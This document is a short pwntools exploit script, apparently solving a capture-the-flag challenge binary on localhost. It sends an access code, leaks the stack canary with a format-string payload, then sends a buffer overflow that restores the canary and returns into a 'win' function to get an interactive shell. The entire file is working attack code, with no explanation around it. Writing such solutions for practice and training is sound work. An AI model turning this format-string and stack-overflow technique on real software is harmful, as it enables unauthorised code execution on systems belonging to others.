from pwn import *

#Establish the target
HOST = "localhost"
PORT = 24610
target = remote(HOST, PORT)
#gdb.attach(target, gdbscript="b *main+35")

# Establish the target binary
target_binary = ELF("../../publish/i95/i95-bocaraton/bocaraton")

# defeat the test
code = b'wambo-jambo' + p32(0xfeedc0de)
target.sendlineafter(b'Code: ', code)

# Leak the stack canary
leak_payload = b"%21$lx"

target.sendlineafter(b'?\n', leak_payload)

# Parse out the stack canary
leak = target.recvline().replace(b"\n", b"")

cookie = int(leak, 16)

info("Stack canary leak is: " + hex(cookie))

rop = ROP(target_binary)

# Addresses needed for the stack overflow
ret_gadget = rop.ret[0]

win_func = target_binary.sym["win"]

# Form the payload for the stack overflow
bof_payload = b"0"*0x78 + p64(cookie) + b"1"*8 + p64(ret_gadget) + p64(win_func)

# Send the stack exploit
target.sendlineafter(b'?\n', bof_payload)

# Drop to an interactive shell
target.interactive()

